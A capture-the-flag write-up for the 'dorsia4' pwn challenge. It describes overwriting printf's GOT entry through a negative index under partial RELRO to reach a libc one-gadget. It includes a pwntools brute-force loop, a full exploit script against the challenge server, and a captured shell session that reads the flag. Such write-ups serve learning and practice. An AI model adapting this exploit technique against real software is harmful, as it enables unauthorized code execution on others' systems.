# dorsia4  
by mito

## 5 solves, 400 pts

* We can overwrite GOT by entering a negative number for i, since it’s partial RELRO.  
* We considered rewriting GOT of printf to One-gadget RCE because scanf is necessary for input.  
* By directly rewriting printf's GOT using gdb, We found that out of the three One-gadget RCE (0x4f2c5, 0x4f322, 0x10a38c), only 0x4f322 was effective.   
* First, we searched for ROP gadget that changed 1 byte from the address of printf and ran it, but all of them had Segmentation fault.  
* Next, by changing the GOT of printf by brute force in 1-byte, we were able to identify multiple bytes where segmentation fault did not occur. Using the python code shown below.

```  
from pwn import *

context.log_level = 'debug'  
BINARY = "./nanowrite"

for i in range(0x0, 0x100):  
 s = process(BINARY)  
 s.recvuntil("\n")  
 try:  
   s.sendline("-103 " + hex(i)[2:])

   s.interactive()  
 except:  
   s.close()  
```

By trial and error for about 1 hour, we was lucky enough to find the procedure
for setting the lowest byte to 0x22.  
```  
s.sendline("-103 " + "91")  
s.sendline("-102 " + "b0")  
s.sendline("-103 " + "38")  
s.sendline("-104 " + "22") ← 0 byte  
```

After another 30 minutes of trial and error, we was able to find a procedure
to change to 0xa33322 of One-gadget RCE(0x7ffff7a33322 with ASLR disabled).  
```  
s.sendline("-103 " + "91")  
s.sendline("-102 " + "b0")  
s.sendline("-103 " + "38")  
s.sendline("-104 " + "22")  ← 0 byte  
s.sendline("-102 " + "b7")  
s.sendline("-103 " + "33")  ← 1 byte  
s.sendline("-102 " + "a3")  ← 2 byte  
```

The final exploit code is below.

```  
from pwn import *

context(os='linux', arch='amd64')  
#context.log_level = 'debug'

BINARY = "./nanowrite"  
elf = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':  
 HOST = "dorsia4.wpictf.xyz"  
 PORT = 31337  
 s = remote(HOST, PORT)  
else:  
 s = process(BINARY)

r = s.recvuntil(" ")[:-1]  
libc_leak = int(r, 16)  
libc_base = libc_leak - 0x10a38c  
gadget_offset = [0x4f2c5, 0x4f322, 0x10a38c]  
one_gadget = libc_base + gadget_offset[1]

print "libc_leak  =", hex(libc_leak)  
print "libc_base  =", hex(libc_base)  
print "one_gadget =", hex(one_gadget)

s.sendline("-103 " + hex(((libc_base>>8)&0xff)-0x40+0x91)[2:])  
s.sendline("-102 " + hex(((libc_base>>16)&0xff)-0x9e+0xb0)[2:])  
s.sendline("-103 " + hex(((libc_base>>8)&0xff)-0x40+0x38)[2:])  
s.sendline("-104 " + "22")  
s.sendline("-102 " + hex(((libc_base>>16)&0xff)-0x9e+0xb7)[2:])  
s.sendline("-103 " + hex(((libc_base>>8)&0xff)-0x40+0x33)[2:])  
s.sendline("-102 " + hex(((libc_base>>16)&0xff)-0x9e+0xa3)[2:])

s.interactive()

'''  
$ python exploit.py r  
[+] Opening connection to dorsia4.wpictf.xyz on port 31337: Done  
libc_leak  = 0x7824c97d438c  
libc_base  = 0x7824c96ca000  
one_gadget = 0x7824c9719322  
[*] Switching to interactive mode  
giv i b  
$ id  
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)  
$ ls  
flag.txt  
nanowrite  
run_problem.sh  
$ cat flag.txt  
WPI{D0_you_like_Hu3y_Lew1s_&_the_News?}  
'''  
```